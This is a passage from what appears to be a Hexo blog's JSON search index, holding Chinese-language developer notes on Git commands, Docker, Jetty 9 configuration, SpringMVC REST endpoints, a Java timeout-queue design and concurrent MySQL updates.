[{"title":"Git命令","url":"/2015/04/02/Git%E5%91%BD%E4%BB%A4/","content":"<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>git init</td>\n<td>初始化一个Git仓库</td>\n<td></td>\n</tr>\n<tr>\n<td>git add <file></td>\n<td>添加</td>\n<td>反复多次使用，添加多个文件</td>\n</tr>\n<tr>\n<td>git commit</td>\n<td>提交</td>\n<td></td>\n</tr>\n<tr>\n<td>git status</td>\n<td>工作区的状态</td>\n<td></td>\n</tr>\n<tr>\n<td>git diff</td>\n<td>查看修改内容</td>\n<td></td>\n</tr>\n<tr>\n<td>git reset –hard commit_id</td>\n<td>返回到某版本</td>\n<td>HEAD指向的版本就是当前版本</td>\n</tr>\n<tr>\n<td>git log</td>\n<td>查看提交历史</td>\n<td>以便确定要回退到哪个版本</td>\n</tr>\n<tr>\n<td>git reflog</td>\n<td>查看命令历史</td>\n<td>以便确定要回到未来的哪个版本</td>\n</tr>\n<tr>\n<td>git checkout – file</td>\n<td>直接丢弃工作区的修改</td>\n<td>未add</td>\n</tr>\n<tr>\n<td>git reset HEAD file</td>\n<td>去掉暂存区，之后还要进行上面步骤</td>\n<td>已经add，未commit</td>\n</tr>\n</tbody></table>\n<span id=\"more\"></span>\n","categories":["Git"],"tags":["Git"]},{"title":"docker环境部署","url":"/2017/05/11/docker%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/","content":"<h2 id=\"docker安装\"><a href=\"#docker安装\" class=\"headerlink\" title=\"docker安装\"></a>docker安装</h2><p>使用系统Ubuntu 15.04 vivid，该版本无法安装最新版docker，需要升级ubuntu到最新版本。<br>安装最新版docker需要添加docker源，参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdG9yZS5kb2NrZXIuY29tL2VkaXRpb25zL2NvbW11bml0eS9kb2NrZXItY2Utc2VydmVyLXVidW50dT90YWI9ZGVzY3JpcHRpb24=\">Docker Community Edition for Ubuntu<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<h2 id=\"docker配置阿里云\"><a href=\"#docker配置阿里云\" class=\"headerlink\" title=\"docker配置阿里云\"></a>docker配置阿里云</h2><p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jci5jb25zb2xlLmFsaXl1bi5jb20vIy9hY2NlbGVyYXRvcg==\">阿里云加速器<i class=\"fa fa-external-link-alt\"></i></span>进行配置。</p>\n<h2 id=\"初步使用docker时出现问题\"><a href=\"#初步使用docker时出现问题\" class=\"headerlink\" title=\"初步使用docker时出现问题\"></a>初步使用docker时出现问题</h2><p>在使用docker build时强行停止后，在使用<code>docker image</code>出现如下错误</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;none&gt;              &lt;none&gt;              1c4475fbe64f        5 minutes ago       194 MB</span><br></pre></td></tr></table></figure>\n<p>使用<code>docker rmi 1c4475fbe64f</code>命令删除该无用image出现如下错误</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error response from daemon: conflict: unable to delete 1c4475fbe64f (must be forced) - image is being used by stopped container a4f0c195cff5</span><br></pre></td></tr></table></figure>\n<p>但是使用<code>docker ps</code>未显示任何数据<br>解决办法先<code>docker rm a4f0c195cff5</code> 之后<code>docker rmi 1c4475fbe64f</code></p>\n<span id=\"more\"></span>\n","categories":["docker"],"tags":["docker"]},{"title":"hexo部署静态文件位置修改","url":"/2015/02/04/hexo%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/","content":"<h2 id=\"使用hexo-htemo-kael后出现样式不对\"><a href=\"#使用hexo-htemo-kael后出现样式不对\" class=\"headerlink\" title=\"使用hexo-htemo-kael后出现样式不对\"></a>使用hexo-htemo-kael后出现样式不对</h2><p>一般在部署到whhxz.github.io上不会出现问题，如果部署在whhxz.github.io&#x2F;myblog上，会出现本地静态文件如js、css等出错</p>\n<p>解决办法：修改hexo-htemo-kael中head.ejs，添加</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"regexp\">/myblog\\/$/</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(reg.<span class=\"title function_\">exec</span>(config.<span class=\"property\">root</span>) == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">    config.<span class=\"property\">root</span> = config.<span class=\"property\">root</span> + <span class=\"string\">&quot;myblog/&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>设置config.root后面添加博客地址，在生成html后，就会自动添加上去，而且为了避免多次添加，所以使用正则表达式判断是否已经存在</p>\n<span id=\"more\"></span>\n"},{"title":"jetty9遇到问题","url":"/2015/02/06/jetty9%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98/","content":"<h2 id=\"端口修改\"><a href=\"#端口修改\" class=\"headerlink\" title=\"端口修改\"></a>端口修改</h2><p>在jetty9中修改$JETTY_HOME&#x2F;start.d&#x2F;http.ini中修改</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jetty.port=9999</span><br><span class=\"line\">http.timeout=30000</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"jetty9中原来jar\"><a href=\"#jetty9中原来jar\" class=\"headerlink\" title=\"jetty9中原来jar\"></a>jetty9中原来jar</h2><p>因为在部署项目时，为了避免war包过大，使用在生成war包的时候，不吧依赖jar添加进去，在jetty使用中，一般是一个jetty使用一个项目，所以需要把依赖jar包放入jetty目录 <strong>$JETTY_HOME&#x2F;lib&#x2F;ext</strong> 中</p>\n<span id=\"more\"></span>\n<h2 id=\"IllegalStateException-No-LoginService\"><a href=\"#IllegalStateException-No-LoginService\" class=\"headerlink\" title=\"IllegalStateException: No LoginService\"></a>IllegalStateException: No LoginService</h2><p>因为在web.xml中添加了权限验证，所以在jetty中也需要相应的配置，在**$JETTY_HOME&#x2F;etc&#x2F;jetty.xml**中添加：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Call</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;addBean&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">Arg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">New</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.eclipse.jetty.security.HashLoginService&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">Set</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span>&gt;</span>Preauth Realm<span class=\"tag\">&lt;/<span class=\"name\">Set</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">Set</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;config&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SystemProperty</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;jetty.home&quot;</span> <span class=\"attr\">default</span>=<span class=\"string\">&quot;.&quot;</span>/&gt;</span>/etc/realm.properties<span class=\"tag\">&lt;/<span class=\"name\">Set</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">Set</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;refreshInterval&quot;</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">Set</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">New</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">Arg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">Call</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意：<Set name=\"name\">Preauth Realm</Set>这个要和web.xml中<realm-name>配置一致</p>\n<h2 id=\"jar包冲突\"><a href=\"#jar包冲突\" class=\"headerlink\" title=\"jar包冲突\"></a>jar包冲突</h2><p>添加在jetty9中使用的是asm-4.1.jar，如果在项目中有使用，需要删除</p>\n<h2 id=\"找不到npn-1-7-0-51-mod\"><a href=\"#找不到npn-1-7-0-51-mod\" class=\"headerlink\" title=\"找不到npn-1.7.0_51.mod\"></a>找不到npn-1.7.0_51.mod</h2><p>从其他地方copy这个文件到$JETTY_HOME&#x2F;modules&#x2F;npn中就可</p>\n","categories":["编程"],"tags":["jetty9 LoginService  port"]},{"title":"SpringMVC RESTful风格","url":"/2016/12/28/springmvc-restfull%E9%A3%8E%E6%A0%BC/","content":"<h2 id=\"RESTfull简介\"><a href=\"#RESTfull简介\" class=\"headerlink\" title=\"RESTfull简介\"></a>RESTfull简介</h2><p>REST全称是(Representational State Transfer)，简单来说指的是一种设计风格，一种规范。在设计时，可以把服务器看做一种资源文件服务器，每条URL代表对应的静态资源，而请求的method，表示最资源的操作,如：GET（获取资源）、PUT（添加资源）、DELETE（删除资源）等操作。<br>简单来说URL—&gt;资源，method—&gt;操作。</p>\n<span id=\"more\"></span>\n<h2 id=\"java例子（基于springMVC）\"><a href=\"#java例子（基于springMVC）\" class=\"headerlink\" title=\"java例子（基于springMVC）\"></a>java例子（基于springMVC）</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/rest&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RestFullController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/test/&#123;id&#125;&quot;, method = RequestMethod.POST)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">post</span><span class=\"params\">(<span class=\"meta\">@PathVariable</span> String id)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;post&quot;</span> + id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/test/&#123;id&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">get</span><span class=\"params\">(<span class=\"meta\">@PathVariable</span> String id)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;get&quot;</span> + id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/test/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">delete</span><span class=\"params\">(<span class=\"meta\">@PathVariable</span> String id)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;delete&quot;</span> + id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同一个url只是对应的method不一样，这样对于数据的增删改查，方法是基于请求时method。</p>\n","categories":["RESTfull"],"tags":["RESTfull","springMVC"]},{"title":"定时消息推送","url":"/2017/01/06/%E5%AE%9A%E6%97%B6%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/","content":"<h2 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h2><p>有一部分数据设置了超时时间，当到达该超时时间改数据还未处理时，推送数据给监控人员。由监控处理相关事情。</p>\n<h3 id=\"技术方案\"><a href=\"#技术方案\" class=\"headerlink\" title=\"技术方案\"></a>技术方案</h3><p>1、维护一个有序链表，在生成改数据后，把该数据加入该有序链表中，保证链表头为最小的超时时间。<br>2、通过线程自旋，获取头部数据是否超时，超时取出数据，查询DB该数据是否已经被处理，未处理超时推送给监控，已经处理丢掉改数据。</p>\n<h3 id=\"考虑问题\"><a href=\"#考虑问题\" class=\"headerlink\" title=\"考虑问题\"></a>考虑问题</h3><ul>\n<li>因为是部署集群，没有调度器，在迭代更新时，重启服务器会导致服务器中数据丢失。<br><strong>解决方案</strong>：在启动服务器时使用redis中incs命令（过期时间30s），当返回值为1时，该服务器从数据库中获取所有需要监控的数据，加入链表。其他服务器因为值不为1，不做处理。</li>\n<li>在服务器运行过程中，其中一台服务器宕机，重启服务器后，当前服务器数据数据丢失，其他服务器正常，重启从数据中获取的数据保护其他服务器中数据。<br><strong>解决方案</strong>：在处理超时数据的时候，同样适用redis的incs命令（过期时间30s），返回值为1的服务器处理数据，另外非1的是丢弃数据。<span id=\"more\"></span></li>\n</ul>\n<h2 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h2><p><strong>队列</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 同步链式队列</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by whhxz on 2016/12/30.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SynsLinkQueue</span>&lt;E <span class=\"keyword\">extends</span> <span class=\"title class_\">Comparable</span>&lt;E&gt;&gt; <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> <span class=\"keyword\">volatile</span> Node&lt;E&gt; head;        <span class=\"comment\">//链表头部</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> <span class=\"keyword\">volatile</span> Node&lt;E&gt; last;        <span class=\"comment\">//链表尾部</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> <span class=\"keyword\">volatile</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> <span class=\"type\">int</span> <span class=\"variable\">size</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SynsLinkQueue</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 返回列表数量</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">size</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 添加链表</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> e</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">add</span><span class=\"params\">(E e)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> offer(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 插入链表</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> e</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">offer</span><span class=\"params\">(E e)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (e == <span class=\"literal\">null</span>)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>();</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.lock;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (head == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                last = head = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(<span class=\"literal\">null</span>, e, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                size++;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Node&lt;E&gt; node = last;</span><br><span class=\"line\">            Node&lt;E&gt; newNode = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (node != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (e.compareTo(node.item) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    newNode = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(node, e, node.next);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (node.next != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                        node.next.prev = newNode;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        last = newNode;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    node.next = newNode;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    node = node.prev;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newNode == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                newNode = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;&gt;(<span class=\"literal\">null</span>, e, head);</span><br><span class=\"line\">                head.prev = newNode;</span><br><span class=\"line\">                head = newNode;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 取出优先级链表头部</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> E <span class=\"title function_\">poll</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.lock;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        E e;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (size != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                Node&lt;E&gt; node = head;</span><br><span class=\"line\">                e = node.item;</span><br><span class=\"line\">                head = head.next;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (head != <span class=\"literal\">null</span>)head.prev = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                size--;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                e = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> e;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 读取链表头部</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> E <span class=\"title function_\">peek</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head == <span class=\"literal\">null</span> ? <span class=\"literal\">null</span> : head.item;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 队列节点</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> &lt;E&gt;</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Node</span>&lt;E&gt; &#123;</span><br><span class=\"line\">        E item;</span><br><span class=\"line\">        Node&lt;E&gt; next;</span><br><span class=\"line\">        Node&lt;E&gt; prev;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.item = element;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.next = next;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.prev = prev;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>推送消息抽象类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.fn.cache.client.CacheClient;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.rt.picking.common.fcm.dto.PushMessageBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.rt.picking.common.service.outapi.FCMCaller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.rt.picking.common.util.SynsLinkQueue;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.rt.picking.soa.dto.PickTimeoutDto;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Date;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 推送消息</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by whhxz on 2017/1/4.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeoutMessageService</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> SynsLinkQueue&lt;PickTimeoutDto&gt; pickTimeoutLink = <span class=\"keyword\">new</span> <span class=\"title class_\">SynsLinkQueue</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> CacheClient cacheClient;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 拣货单</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addLinkDate</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        pickTimeoutLink.add(calculatePickTimeout());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> PickTimeoutDto <span class=\"title function_\">calculatePickTimeout</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> PushMessageBody <span class=\"title function_\">pushPickAppMessage</span><span class=\"params\">(String pickingId)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">PickTimeoutDto</span> <span class=\"variable\">timeoutDto</span> <span class=\"operator\">=</span> pickTimeoutLink.peek();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (timeoutDto.getTimeout().compareTo(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) &lt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                    timeoutDto = pickTimeoutLink.poll();</span><br><span class=\"line\">                    <span class=\"type\">PushMessageBody</span> <span class=\"variable\">pushMessageInfo</span> <span class=\"operator\">=</span> pushPickAppMessage(timeoutDto.getPickingId());</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (pushMessageInfo != <span class=\"literal\">null</span> &amp;&amp; cacheClient.incr(<span class=\"string\">&quot;temp_&quot;</span> + timeoutDto.getPickingId(), <span class=\"number\">60</span>) == <span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//推送消息</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//阶梯休眠</span></span><br><span class=\"line\">                    Thread.sleep(i * <span class=\"number\">1000</span>);</span><br><span class=\"line\">                    i = (i = i &lt;&lt; <span class=\"number\">1</span>) &gt; <span class=\"number\">10</span> ? <span class=\"number\">1</span>: i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>最后方案被否决，理由太复杂。最终解决方案，使用定时器，定时查询超时数据。</p>\n","categories":["链表","工作方案"],"tags":["有序链表"]},{"title":"MYSQL并发修改库存","url":"/2017/05/12/MYSQL%E5%B9%B6%E5%8F%91%E4%BF%AE%E6%94%B9%E5%BA%93%E5%AD%98/","content":"<h2 id=\"MYSQL插入或更新\"><a href=\"#MYSQL插入或更新\" class=\"headerlink\" title=\"MYSQL插入或更新\"></a>MYSQL插入或更新</h2><blockquote>\n<p>问题：在数据库操作时，如果需要先判断数据是否存在，做插入或者更新操作。在并发情况下，容易出现异常。</p>\n</blockquote>\n<p>解决办法：使用<code>INSERT INTO TABLE(A, B, C) VALUES(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;) ON DUPLICATE KEY UPDATE B = &#39;b&#39;, C=&#39;c&#39;</code>，此处A为唯一约束，在插入时，如果已经存在数据为a，则做更新操作。</p>\n<h2 id=\"并发修改数量\"><a href=\"#并发修改数量\" class=\"headerlink\" title=\"并发修改数量\"></a>并发修改数量</h2><blockquote>\n<p>在并发扣除库存时，库存数量不能扣到小于0。</p>\n</blockquote>\n<p>使用<code>UPDATE TABLE SET A = A - a WHERE A &gt;= a AND ID = &#39;xx&#39;</code>，通过SQL返回值是否大于0，判断是否操作成功。</p>\n<span id=\"more\"></span>\n","categories":["MYSQL"],"tags":["MYSQL","并发修改"]},{"title":"Elasticsearch初使用","url":"/2017/07/20/Elasticsearch%E5%88%9D%E4%BD%BF%E7%94%A8/","content":"<hr>\n<h3 id=\"下载安装\"><a href=\"#下载安装\" class=\"headerlink\" title=\"下载安装\"></a>下载安装</h3><p>通过Elasticsearch搜索数据库，需要下载Elasticsearch、Kibana、Logstash。（当前使用版本5.0.0）<br>Elasticsearch下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxhc3RpYy5jby9jbi9wcm9kdWN0cy9lbGFzdGljc2VhcmNo\">https://www.elastic.co/cn/products/elasticsearch<i class=\"fa 